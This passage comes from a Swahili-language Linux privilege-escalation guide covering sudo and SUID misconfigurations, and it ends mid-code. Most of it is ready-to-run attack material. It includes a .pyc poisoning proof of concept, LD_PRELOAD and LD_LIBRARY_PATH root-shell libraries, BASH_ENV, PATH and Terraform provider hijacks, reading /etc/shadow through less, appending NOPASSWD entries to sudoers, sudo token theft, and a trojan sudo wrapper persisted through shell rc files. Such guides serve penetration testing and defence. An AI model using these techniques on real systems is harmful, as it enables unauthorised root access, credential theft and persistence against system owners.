Ruhusa ya sudo isiyo na vizuizi na yenye uwezo wa root kwa `prusaslicer` au `prusa-slicer` inafaa kuchunguzwa ikiwa mpigaji anaweza kuchagua mradi wa `.3mf` utakaokatwa. Mradi unaweza kuwa na script ya uchakataji wa baada ya kazi inayotekelezwa wakati G-code inapotolewa; miradi iliyoundwa mahsusi inaweza kutekeleza amri ndani ya PrusaSlicer hadi toleo la 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Thibitisha kanuni halisi ya sudo inayotumika, toleo la binary na viraka vya msambazaji, chanzo cha mradi, na iwapo njia husika ya uhamishaji inaendeshwa kabla ya kuhitimisha kuwa mpaka wa ruhusa unaweza kufikiwa. Hoja ya mradi isiyobadilika au sera ya `NOEXEC` inayotumika inaweza kubadilisha matokeo. Kugundua tu kwamba slicer imesakinishwa hakuthibitishi uwepo wa njia ya kupandisha ruhusa.

### SETENV

Maelekezo haya huruhusu mtumiaji **kuweka kigezo cha mazingira** anapotekeleza kitu:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Mfano huu, **uliotegemea mashine ya HTB Admirer**, ulikuwa **hatarini** kwa **PYTHONPATH hijacking**, na hivyo kuruhusu kupakia maktaba yoyote ya Python huku script ikiendeshwa kama root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Sumu ya `__pycache__` / `.pyc` inayoweza kuandikwa katika imports za Python zinazoruhusiwa na sudo

Ikiwa **script ya Python inayoendeshwa kwa sudo** ina-import module ambayo directory ya package yake ina **`__pycache__` inayoweza kuandikwa**, unaweza kuibadilisha `.pyc` iliyohifadhiwa kwenye cache na kupata code execution kama mtumiaji mwenye privileged access kwenye import inayofuata.<sup>[[30]](#references)</sup>

- Kwa nini inafanya kazi:
  - CPython huhifadhi bytecode cache kwenye `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Interpreter huthibitisha **header** (magic + metadata ya timestamp/hash inayohusishwa na source), kisha hutekeleza code object iliyohifadhiwa katika mfumo wa marshaled baada ya header hiyo.
  - Ikiwa unaweza **kufuta na kuunda upya** faili ya cache kwa sababu directory inaweza kuandikwa, `.pyc` inayomilikiwa na root lakini isiyoweza kuandikwa bado inaweza kubadilishwa.
- Njia ya kawaida:
  - `sudo -l` inaonyesha script au wrapper ya Python unayoweza kuendesha kama root.
  - Script hiyo ina-import module ya ndani kutoka `/opt/app/`, `/usr/local/lib/...`, n.k.
  - Directory ya `__pycache__` ya module iliyo-importiwa inaweza kuandikwa na mtumiaji wako au na kila mtu.

Uchunguzi wa haraka:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Ukiweza kukagua script inayoendeshwa kwa haki za juu, tambua modules zilizoingizwa na njia ya cache yake:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Mtiririko wa matumizi mabaya:

1. Endesha script inayoruhusiwa na sudo mara moja ili Python iunde faili halali ya cache ikiwa bado haipo.
2. Soma byte 16 za kwanza kutoka kwenye `.pyc` halali na uzitumie tena kwenye faili iliyoharibiwa.
3. Compile code object ya payload, `marshal.dumps(...)` itengeneze, futa faili asilia ya cache, kisha uliunde upya kwa kutumia header asilia pamoja na bytecode hasidi.
4. Endesha tena script inayoruhusiwa na sudo ili import iendeshe payload yako kama root.

Mambo muhimu:

- Kutumia tena header asilia ni muhimu kwa sababu Python hukagua metadata ya cache dhidi ya faili ya source, si kama sehemu ya bytecode inalingana kweli na source.
- Hii ni muhimu hasa ikiwa faili ya source inamilikiwa na root na hairuhusiwi kuandikwa, lakini directory ya `__pycache__` inaweza kuandikwa.
- `PYTHONDONTWRITEBYTECODE=1` na `python -B` huzuia Python kuandika faili mpya za `.pyc`; **hazizuii** kupakia cache ambayo tayari ni halali na imebadilishwa na mshambuliaji. Jambo muhimu ni ikiwa mtumiaji mwenye ruhusa za chini anaweza kubadilisha cache ambayo import yenye ruhusa za juu itakubali. Python hukagua metadata ya timestamp/size au hash kabla ya kupakia bytecode iliyohifadhiwa kwenye cache. Tazama [marejeleo ya import ya Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) na [nyaraka za command-line](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Muundo wa chini kabisa wa proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Uimarishaji:

- Hakikisha hakuna saraka kwenye njia ya import ya Python yenye ruhusa za juu inayoweza kuandikwa na watumiaji wenye ruhusa ndogo, ikijumuisha `__pycache__`.
- Kagua umiliki na ruhusa za saraka za cache, ikijumuisha faili zilizopo za `.pyc`. Kuzima uandishi wa bytecode kunaweza kupunguza uundaji wa cache mpya, lakini hakufanyi cache iliyopo inayoweza kubadilishwa isiwe hatari.
- Chukulia moduli za Python za ndani na saraka za cache zinazoweza kuandikwa kwa namna ileile unavyochukulia script za shell au maktaba za pamoja zinazoweza kuandikwa na zinazoendeshwa na root.

### BASH_ENV imehifadhiwa kupitia sudo env_keep → root shell

Ikiwa sudoers itahifadhi `BASH_ENV` (kwa mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya Bash ya kuanzisha shell zisizoingiliana ili kuendesha msimbo wowote kama root unapoendesha amri iliyoruhusiwa.<sup>[[24]](#references)</sup>

- Kwa nini inafanya kazi: Kwa shell zisizoingiliana, Bash hutathmini `$BASH_ENV` na kuendesha faili hiyo kupitia `source` kabla ya kuendesha script lengwa. Sheria nyingi za sudo huruhusu kuendesha script au wrapper ya shell. Ikiwa `BASH_ENV` imehifadhiwa na sudo, faili yako huendeshwa ikiwa na ruhusa za root.<sup>[[23]](#references)</sup>

- Mahitaji:
  - Sheria ya sudo unayoweza kutumia (lengo lolote linaloanzisha `/bin/bash` isiyoingiliana, au script yoyote ya bash).
  - `BASH_ENV` ipo kwenye `env_keep` (kagua kwa `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Hardening:
  - Ondoa `BASH_ENV` (na `ENV`) kwenye `env_keep`, na pendelea `env_reset`.
  - Epuka kutumia shell wrappers kwa amri zinazoruhusiwa na sudo; tumia binaries ndogo.
  - Fikiria kuwezesha uandishi wa kumbukumbu za I/O za sudo na kutuma arifa wakati env vars zilizohifadhiwa zinapotumika.

### Terraform kupitia sudo huku HOME ikihifadhiwa (!env_reset)

Wakati sudo inaporuhusu Terraform kuendeshwa kama mtumiaji mwenye mapendeleo zaidi, `!env_reset` ni kidokezo cha kukagua ni environment variables zipi hasa zinabaki chini ya sheria hiyo mahususi. Thibitisha `HOME` au `TF_CLI_CONFIG_FILE` inayotumika kabla ya kudhani kwamba `.terraformrc` au `terraform.rc` inayoweza kuandikwa na mtumiaji anayeita ndiyo usanidi wa CLI unaotumika. Ingizo la `provider_installation.dev_overrides` lina umuhimu tu ikiwa amri ya Terraform iliyowekwa maalumu inapakia provider hiyo na mtumiaji anayeita anaweza kuweka executable yake kwenye directory iliyochaguliwa.<sup>[[25]](#references)</sup>

- Elekeza provider inayohitajika kwenye directory inayoweza kuandikwa na uweke plugin hasidi yenye jina la provider (kwa mfano, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform itashindwa kufanya handshake ya Go plugin lakini itatekeleza payload kama root kabla haijafa, na kuacha SUID shell nyuma.

### TF_VAR overrides + bypass ya uthibitishaji wa symlink

Vigezo vya Terraform vinaweza kutolewa kupitia environment variables za `TF_VAR_<name>` ikiwa sheria mahususi ya sudo inazihifadhi. Kusoma kupitia source-symlink pia kunahitaji provider inayofuata link na kunakili matokeo yaliyolindwa hadi kwenye eneo ambalo caller anaweza kusoma. Kuandika kupitia destination-symlink ni jambo tofauti: kunahitaji ingizo la destination linalodhibitiwa na caller na provider yenye mamlaka ya juu inayofuata link wakati wa kuandika; kazi ya baadaye iliyoratibiwa ni mojawapo tu ya matokeo yanayowezekana. Kabla ya kujaribu mojawapo ya njia hizi, kagua ruhusa halisi ya sudo, faili husika za `.tf`, usanidi wa CLI uliochaguliwa, na umiliki wa njia kwa kutumia amri za kusoma pekee kama `sudo -l`, `stat`, na `readlink`. Uthibitishaji dhaifu wa kileksika kama `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` hautatambua symlinks:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform hutatua symlink na kunakili `/root/root.txt` halisi kwenye eneo lengwa linaloweza kusomwa na mshambuliaji. Mbinu hiyo hiyo inaweza kutumika **kuandika** kwenye njia zenye mamlaka ya juu kwa kuunda symlink za eneo lengwa mapema (kwa mfano, kuelekeza njia lengwa ya provider ndani ya `/etc/cron.d/`).

### requiretty / !requiretty

Kwenye baadhi ya distributions za zamani, sudo inaweza kusanidiwa kwa `requiretty`, ambayo hulazimisha sudo kuendeshwa tu kutoka kwenye TTY shirikishi. Ikiwa `!requiretty` imewekwa (au chaguo hilo halipo), sudo inaweza kutekelezwa kutoka kwenye miktadha isiyo shirikishi kama vile reverse shells, kazi za cron, au scripts.

```bash
Defaults !requiretty
```

Hili si vulnerability ya moja kwa moja lenyewe, lakini linaongeza hali ambazo sheria za sudo zinaweza kutumiwa vibaya bila kuhitaji PTY kamili.

### Sudo env_keep+=PATH / secure_path isiyo salama → PATH hijack

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` yenye maingizo yanayoweza kuandikiwa na mshambuliaji (kwa mfano, `/home/<user>/bin`), amri ya nje isiyo na njia kamili ndani ya lengwa linaloruhusiwa na sudo inaweza kufunikwa.<sup>[[3]](#references)</sup> Kutokuwepo kwa `secure_path` inayotumika pia kunastahili kuchunguzwa **ikiwa** mazingira ya sudo ya amri yanahifadhi `PATH` inayodhibitiwa na mtumiaji aliyeiita; kutokuwepo kwake pekee hakuthibitishi hilo. Soma script iliyoruhusiwa bila kuiendesha, kisha thibitisha sheria halisi ya RunAs na argument, njia ya utafutaji wa amri inayotumika, na saraka ya awali inayoweza kuandikiwa na kupitiwa ambayo ina jina la amri hiyo. Uthibitishaji, `NOEXEC`, shell builtins, na njia kamili za amri vinaweza kubadilisha matokeo.

- Mahitaji: sheria ya sudo (mara nyingi `NOPASSWD`) inayoendesha script/binary inayotumia amri bila njia kamili (`free`, `df`, `ps`, n.k.) na ingizo la PATH linaloweza kuandikiwa na linalotafutwa kwanza.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Kukwepa njia katika utekelezaji wa Sudo
**Ruka** ili kusoma faili nyingine au kutumia **symlinks**. Kwa mfano, katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Hatua za kujikinga**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Amri ya Sudo/jozi ya SUID bila njia ya amri

Ikiwa **ruhusa ya sudo** imetolewa kwa amri moja **bila kubainisha njia yake**: _hacker10 ALL= (root) less_, unaweza kuitumia kujinufaisha kwa kubadilisha kigezo cha PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **inatekeleza amri nyingine bila kubainisha njia yake (kila mara kagua maudhui ya binary ya ajabu ya SUID kwa kutumia** _**strings**_ **)**.

[Mifano ya payload za kutekeleza.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binary ya SUID yenye njia ya amri

Ikiwa binary ya **suid** **inatekeleza amri nyingine kwa kubainisha njia yake**, basi unaweza kujaribu **export function** iliyopewa jina la amri inayoitwa na faili ya suid.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_, unapaswa kujaribu kuunda na ku-export function hiyo:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Kisha, unapopiga simu kwa binary ya SUID, function hii itatekelezwa

### Custom SUID copy wrappers

Utility ya SUID inayomilikiwa na root na inayokubali njia za chanzo na lengwa inaweza kuvuka mipaka miwili tofauti ya uaminifu. Ikiunda amri ya shell kutoka kwa mojawapo ya hoja (kwa mfano, kupitisha amri ya `cp` iliyoundwa kwa `system()`), metacharacters za shell zinaweza kutekeleza amri nyingine kwa kutumia privileges zake za effective. Hata ikiendesha `cp` kwa usalama bila shell, lengwa lisilozuiliwa linaweza kuruhusu uandishi wowote wa privileged kwenye faili kama `/etc/passwd`. Kagua jinsi wrapper inavyoshughulikia hoja, tabia ya effective UID, vizuizi vya lengwa, na kama faili iliyonakiliwa huhifadhi maudhui yanayodhibitiwa na caller; kosa la kawaida la `cp` au SUID bit pekee havithibitishi mojawapo ya njia hizi. Orodhesha binary na ruhusa zake kwa njia isiyobadilisha chochote kabla ya majaribio yoyote ya mikono.

### Script inayoweza kuandikwa na inayoendeshwa na wrapper ya SUID

Mipangilio mibaya ya kawaida katika custom app ni binary ya SUID inayomilikiwa na root ambayo hufanya script, huku script yenyewe ikiwa inaweza kuandikwa na watumiaji wenye privileges ndogo.

Muundo wa kawaida:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Ikiwa `/usr/local/bin/backup.sh` inaweza kuandikwa, unaweza kuongeza amri za payload kisha utekeleze wrapper ya SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Ukaguzi wa haraka:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Njia hii ya mashambulizi hutokea hasa katika wrapper za "maintenance"/"backup" zinazokuja ndani ya `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** hutumika kubainisha maktaba moja au zaidi zinazoshirikiwa (faili za .so) zipakiwe na loader kabla ya maktaba nyingine zote, ikiwemo maktaba ya kawaida ya C (`libc.so`). Mchakato huu hujulikana kama kupakia maktaba mapema.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumiwa vibaya, hasa kwenye executable za **suid/sgid**, mfumo hutekeleza masharti fulani:

- Loader hupuuza **LD_PRELOAD** kwa executable ambazo user ID halisi (_ruid_) hailingani na user ID inayotumika (_euid_).
- Kwa executable zenye suid/sgid, ni maktaba zilizo kwenye njia za kawaida na ambazo pia zina suid/sgid pekee zinazopakiwa mapema.

Kuongeza ruhusa kunaweza kutokea ikiwa unaweza kutekeleza amri kwa kutumia `sudo` na matokeo ya `sudo -l` yanajumuisha kauli **env_keep+=LD_PRELOAD**. Usanidi huu huruhusu kigezo cha mazingira **LD_PRELOAD** kuendelea kuwepo na kutambuliwa hata amri zinapoendeshwa kwa kutumia `sudo`, jambo linaloweza kusababisha msimbo wowote kutekelezwa kwa ruhusa zilizoinuliwa.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Hifadhi kama **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Kisha **ikompile** kwa kutumia:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Hatimaye, **escalate privileges** kwa kuendesha

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> privesc inayofanana inaweza kutumiwa vibaya ikiwa mshambulizi anadhibiti kigezo cha mazingira cha **LD_LIBRARY_PATH**, kwa sababu anadhibiti njia ambayo maktaba zitatafutwa.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** inayoonekana isiyo ya kawaida, ni vyema kuthibitisha ikiwa inapakia faili za **.so** ipasavyo. Hili linaweza kukaguliwa kwa kutekeleza amri ifuatayo:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaashiria uwezekano wa exploitation.

Ili kufanya exploitation, mtu angeunda faili la C, tuseme _"/path/to/.config/libcalc.c"_, lenye code ifuatayo:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Msimbo huu, ukishakusanywa na kutekelezwa, unalenga kuinua ruhusa kwa kubadilisha ruhusa za faili na kutekeleza shell yenye ruhusa za juu.

Kusanya faili ya C iliyo hapo juu kuwa faili ya shared object (.so) kwa kutumia:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Hatimaye, kuendesha binary ya SUID iliyoathiriwa kunapaswa kuanzisha exploit, na hivyo kuruhusu uwezekano wa kuathiri mfumo.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Sasa kwa kuwa tumepata binary ya SUID inayopakia library kutoka kwenye folda tunayo ruhusa ya kuandikia, hebu tutengeneze library kwenye folda hiyo kwa jina linalohitajika:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Ukipata hitilafu kama vile

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

hiyo inamaanisha kuwa library uliyotengeneza inahitaji kuwa na function inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyokusanywa ya Unix binaries ambazo mshambuliaji anaweza kutumia vibaya ili kukwepa vizuizi vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa, lakini kwa hali ambazo unaweza **kuingiza arguments pekee** kwenye command.

Mradi huu hukusanya functions halali za Unix binaries zinazoweza kutumiwa vibaya ili kutoka kwenye restricted shells, kuongeza au kudumisha privileges zilizoinuliwa, kuhamisha files, kuanzisha bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l`, unaweza kutumia tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia ikiwa inapata njia ya kutumia vibaya sheria yoyote ya sudo.

### Kutumia Tena Sudo Tokens

Katika hali ambapo una **sudo access** lakini huna password, unaweza kuongeza privileges kwa **kusubiri command ya sudo itekelezwe kisha kuteka nyara session token**.<sup>[[18]](#references)</sup>

Mahitaji ya kuongeza privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" ametumia **`sudo`** kutekeleza jambo fulani katika **dakika 15 zilizopita** (kwa chaguo-msingi, huo ndio muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza password)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kuwasha `ptrace_scope` kwa muda kwa kutumia `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kuibadilisha kabisa kwenye `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji haya yote yametimizwa, **unaweza kuongeza privileges kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Exploit ya kwanza** (`exploit.sh`) itaunda binary `activate_sudo_token` kwenye _/tmp_. Unaweza kuitumia **kuwasha sudo token katika session yako** (hutapata root shell moja kwa moja; tekeleza `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Exploit ya pili** (`exploit_v2.sh`) itaunda shell ya sh katika _/tmp_ **inayomilikiwa na root na yenye setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Exploit ya tatu** (`exploit_v3.sh`) **itaunda faili la sudoers** linalofanya **tokeni za sudo zidumu milele na kuruhusu watumiaji wote kutumia sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Ikiwa una **ruhusa za kuandika** kwenye folda au kwenye faili zozote zilizoundwa ndani ya folda, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) **kuunda sudo token ya user na PID**.\
Kwa mfano, ikiwa unaweza kubadilisha faili _/var/run/sudo/ts/sampleuser_ na una shell kama user huyo yenye PID 1234, unaweza **kupata sudo privileges** bila kuhitaji kujua password kwa kufanya:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizo ndani ya `/etc/sudoers.d` husanidi nani anaweza kutumia `sudo` na jinsi ya kuitumia. **Kwa chaguomsingi, faili hizi zinaweza kusomwa tu na mtumiaji root na kundi root**.\
**Ikiwa** unaweza **kusoma** faili hii, unaweza **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** kwenye faili yoyote, utaweza **kuongeza mamlaka yako**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Ukiwa na ruhusa ya kuandika, unaweza kuitumia vibaya.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Njia nyingine ya kutumia vibaya ruhusa hizi:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Kuna baadhi ya mbadala wa binary ya `sudo`, kama vile `doas` ya OpenBSD. Kumbuka kuangalia usanidi wake katika `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Ikiwa `doas` inaruhusu kihariri au interpreter, angalia njia za kutoroka za mtindo wa GTFOBins:

```bash
doas vim
:!/bin/sh
```

Sheria ya `doas` yenye uwezo wa kutumia root kwa `dstat` ya awali iliyotengenezwa kwa Python pia inafaa kuchunguzwa kwa njia ya plugin. [Mwongozo wake](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) na [source code yake](https://github.com/dstat-real/dstat/blob/master/dstat) zinaorodhesha `/usr/share/dstat/` na `/usr/local/share/dstat/` miongoni mwa maeneo ya plugin za `dstat_*.py`. Ikiwa mtumiaji wa sasa anaweza kuandika na kutafuta katika eneo linalotumiwa na build iliyosakinishwa, plugin iliyochaguliwa inaweza kuendeshwa kwa utambulisho wa RunAs wa `doas`. Thibitisha sheria inayotumika, utafutaji wa plugin katika build hiyo, ruhusa za directory na parent directories au ACLs, na kama mpigaji anaweza kuchagua plugin; sheria ya `dstat` au directory inayoweza kuandikika pekee ni kidokezo tu. Implementations nyingine za `dstat` zinaweza kutumia mifumo tofauti ya plugin. Kagua metadata bila kupakia plugin.

### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kwa kawaida huunganisha kwenye mashine na kutumia `sudo`** ili kupandisha privileges, na umepata shell katika muktadha wa mtumiaji huyo, unaweza **kuunda executable mpya ya sudo** itakayoendesha code yako kama root na kisha amri ya mtumiaji. Kisha, **rekebisha $PATH** ya muktadha wa mtumiaji (kwa mfano, kwa kuongeza path mpya kwenye .bash_profile) ili mtumiaji anapoendesha sudo, executable yako ya sudo iendeshwe.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash), utahitaji kurekebisha faili nyingine ili kuongeza path mpya. Kwa mfano, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) hurekebisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Maktaba Inayoshirikiwa

### ld.so

Faili `/etc/ld.so.conf` huonyesha **mahali ambapo faili za usanidi zinazopakiwa zinatoka**. Kwa kawaida, faili hii huwa na njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kuwa faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **huonyesha folda nyingine** ambamo **maktaba** zitatafutwa. Kwa mfano, maudhui ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kuwa mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu yoyote **mtumiaji ana ruhusa za kuandika** kwenye njia zozote zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote iliyo ndani ya faili ya usanidi katika `/etc/ld.so.conf.d/*.conf`, anaweza kupandisha haki zake.\
Tazama **jinsi ya kutumia vibaya usanidi huu** katika ukurasa ufuatao:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Kwa kunakili lib kwenye `/var/tmp/flag15/`, programu itaitumia kutoka eneo hili kama ilivyoainishwa kwenye variable ya `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Kisha unda maktaba hasidi katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
